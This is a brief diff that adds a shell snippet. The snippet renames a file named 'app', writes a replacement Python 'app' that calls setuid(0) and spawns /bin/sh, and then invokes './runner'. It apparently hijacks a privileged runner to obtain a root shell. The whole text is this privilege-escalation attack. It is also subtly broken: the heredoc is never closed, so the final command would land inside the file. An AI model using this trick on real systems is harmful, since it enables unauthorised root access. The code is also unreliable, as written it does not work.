@@ -1,0 +1,8 @@
+mv app app.avvafsfs
+
+cat <<EOF > app
+import os
+os.setuid(0)
+os.system('/bin/sh')
+
+./runner
